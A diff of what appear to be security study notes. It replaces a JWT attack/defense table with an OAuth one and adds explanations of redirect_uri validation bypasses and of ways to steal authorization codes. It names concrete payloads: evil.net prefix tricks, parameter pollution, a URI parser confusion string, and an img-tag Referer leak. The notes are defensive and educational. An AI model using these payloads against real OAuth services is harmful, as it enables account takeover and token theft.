@@ -1,6 +1,48 @@
-kid Injection	kid: "../dev/null" → empty key, sign w/ ""	Sanitize/validate kid param
-Weak Secret	secret=123456 brute-forced	32+ random bytes, env vars, never code
-No Signature Check	jwt.decode() instead of verify()	Always verify(), never just decode
-Missing Claims	No exp/iss/aud validation	Check exp < now, iss matches, aud correct
-JWK/JKU Abuse	Attacker hosts own public key	Pin keys, validate JWK URLs, no remote fetch
-Token Leakage	JWT in URL/logs → stolen	HTTPS only, short expiry, HttpOnly cookies
+Attack	Defense
+redirect_uri tampering	Exact-match validation against pre-registered URI
+Open redirector	Mandatory client registration
+Code interception	TLS + PKCE
+CSRF	Validate state on every callback
+Code replay	Revoke ALL tokens on double-use detection
+Implicit flow leakage	Use Auth Code + PKCE, never Implicit
+Referer leakage	No third-party resources on callback page
+Pre-account takeover	Verify email before linking OAuth identity
+Token validation	Validate aud (audience) claim matches your client_id
+Scope escalation	Re-validate scope server-side on every request
+JWT confusion	Hardcode expected alg, whitelist kid values
+SSRF via registration	Restrict or disable dynamic client registration
+Refresh token theft	Refresh token rotation + sender-constrained tokens
+
+
+edirect-Based OAuth Vulnerabilities
+1. Leaking Codes/Tokens via Malicious redirect_uri
+
+If the auth server doesn't validate redirect_uri properly, an attacker constructs a CSRF-like attack that tricks the victim's browser into initiating an OAuth flow with an attacker-controlled redirect_uri. The auth code or token lands directly on the attacker's server.​
+2. Flawed redirect_uri Validation Bypasses
+
+Even when a whitelist exists, validation can often be bypassed:​
+
+    Prefix-only check — server only checks the string starts with the right domain, so https://legit.com.evil.net passes
+
+    Directory traversal — https://legit.com/oauth/callback/../../attacker/path resolves to a different page on a whitelisted domain
+
+    Duplicate parameter pollution — &redirect_uri=legit.com&redirect_uri=evil.com — some parsers take the last value
+
+    localhost bypass — servers permitting any localhost URI in prod can be abused with localhost.evil.net
+
+    URI parser confusion — tricks like https://default.com &@evil.net#@bar.evil.net/ exploit differences in how components parse the URI
+
+    response_mode switching — changing from query to fragment or web_message can alter how redirect_uri is parsed and widen what's accepted
+
+3. Stealing Codes via Proxy Page (Open Redirect Chain)
+
+When you can't point redirect_uri to an external domain directly, you redirect it to another page on the whitelisted domain that has an open redirect — then chain that redirect to your server. The code/token hops through the trusted domain on its way to the attacker.​
+4. Stealing Codes via XSS on the Redirect Target
+
+Point redirect_uri to a page on the whitelisted domain that has an XSS vulnerability. The injected script reads ?code= from the URL and exfiltrates it. More severe than standalone XSS because the attacker gains persistent account access in their own browser.​
+5. Stealing Codes via HTML Injection + Referer Leak
+
+If JS injection is blocked (CSP etc.), inject an <img src="evil.net"> on the redirect target page. Some browsers (Firefox) include the full URL with query string in the Referer header when fetching the image — leaking ?code= to the attacker's server.​
+6. Stealing Codes via Dangerous JS on Redirect Target
+
+Insecure web messaging scripts (postMessage etc.) on the whitelisted domain can be chained as gadgets — passing the code/token through a series of scripts until it leaks to an external domain.
